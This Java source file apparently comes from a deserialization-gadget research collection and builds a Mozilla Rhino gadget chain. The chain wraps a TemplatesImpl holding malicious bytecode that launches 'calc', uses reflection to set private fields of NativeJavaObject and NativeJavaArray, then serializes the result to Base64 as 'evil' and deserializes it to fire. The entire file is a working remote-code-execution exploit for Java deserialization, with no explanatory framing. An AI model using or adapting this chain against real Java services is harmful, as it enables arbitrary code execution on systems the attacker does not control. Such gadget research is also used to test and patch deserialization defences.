package gadget.Rhino;

import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;
import util.GadgetUtils;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Hashtable;
import java.util.Map;

public class Rhino2 {

//    public static String fileName = "MozillaRhino2.bin";

    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }

    public static void main(String[] args) throws Exception {

        // 生成包含恶意类字节码的 TemplatesImpl 类
        Templates templates = GadgetUtils.createTemplatesImpl("calc");

        // 初始化一个 Environment 对象作为 scope
        ScriptableObject scope = new Environment();
        // 创建 associatedValues
        Map<Object, Object> associatedValues = new Hashtable<>();
        // 创建一个 ClassCache 实例
        Object classCacheObject = ReflectionUtils.createInstanceUnsafely(ClassCache.class);
        associatedValues.put("ClassCache", classCacheObject);

        Field associateField = ScriptableObject.class.getDeclaredField("associatedValues");
        associateField.setAccessible(true);
        associateField.set(scope, associatedValues);

        Class<?>       memberBoxClass = Class.forName("org.mozilla.javascript.MemberBox");
        Constructor<?> constructor    = memberBoxClass.getDeclaredConstructor(Method.class);
        constructor.setAccessible(true);
        Object initContextMemberBox = constructor.newInstance(Context.class.getMethod("enter"));

        ScriptableObject initContextScriptableObject = new Environment();
        Method           makeSlot                    = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
        makeSlot.setAccessible(true);
        Object slot = makeSlot.invoke(initContextScriptableObject, "su18", 0, 4);

        Class<?> slotClass   = Class.forName("org.mozilla.javascript.ScriptableObject$GetterSlot");
        Field    getterField = slotClass.getDeclaredField("getter");
        getterField.setAccessible(true);
        getterField.set(slot, initContextMemberBox);


        // 实例化 NativeJavaObject 类
        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();

        Field parentField = NativeJavaObject.class.getDeclaredField("parent");
        parentField.setAccessible(true);
        parentField.set(initContextNativeJavaObject, scope);

        Field isAdapterField = NativeJavaObject.class.getDeclaredField("isAdapter");
        isAdapterField.setAccessible(true);
        isAdapterField.set(initContextNativeJavaObject, true);

        Field adapterObject = NativeJavaObject.class.getDeclaredField("adapter_writeAdapterObject");
        adapterObject.setAccessible(true);
        adapterObject.set(initContextNativeJavaObject, Rhino2.class.getDeclaredMethod("customWriteAdapterObject",
                Object.class, ObjectOutputStream.class));

        Field javaObject = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject.setAccessible(true);
        javaObject.set(initContextNativeJavaObject, initContextScriptableObject);

        ScriptableObject scriptableObject = new Environment();
        scriptableObject.setParentScope(initContextNativeJavaObject);
        makeSlot.invoke(scriptableObject, "outputProperties", 0, 2);


        // 实例化 NativeJavaArray类
        NativeJavaArray nativeJavaArray = (NativeJavaArray) ReflectionUtils.createInstanceUnsafely(NativeJavaArray.class);

        Field parentField2 = NativeJavaObject.class.getDeclaredField("parent");
        parentField2.setAccessible(true);
        parentField2.set(nativeJavaArray, scope);

        Field javaObject2 = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject2.setAccessible(true);
        javaObject2.set(nativeJavaArray, templates);

        nativeJavaArray.setPrototype(scriptableObject);

        Field prototypeField = NativeJavaObject.class.getDeclaredField("prototype");
        prototypeField.setAccessible(true);
        prototypeField.set(nativeJavaArray, scriptableObject);

        // 实例化最外层的 NativeJavaObject

        NativeJavaObject nativeJavaObject = new NativeJavaObject();

        Field parentField3 = NativeJavaObject.class.getDeclaredField("parent");
        parentField3.setAccessible(true);
        parentField3.set(nativeJavaObject, scope);

        Field isAdapterField3 = NativeJavaObject.class.getDeclaredField("isAdapter");
        isAdapterField3.setAccessible(true);
        isAdapterField3.set(nativeJavaObject, true);

        Field adapterObject3 = NativeJavaObject.class.getDeclaredField("adapter_writeAdapterObject");
        adapterObject3.setAccessible(true);
        adapterObject3.set(nativeJavaObject, Rhino2.class.getDeclaredMethod("customWriteAdapterObject",
                Object.class, ObjectOutputStream.class));

        Field javaObject3 = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject3.setAccessible(true);
        javaObject3.set(nativeJavaObject, nativeJavaArray);

        String evil = SerializerUtils.serializeBase64(nativeJavaObject);
        SerializerUtils.unserialize(Base64.getDecoder().decode(evil));

    }

}
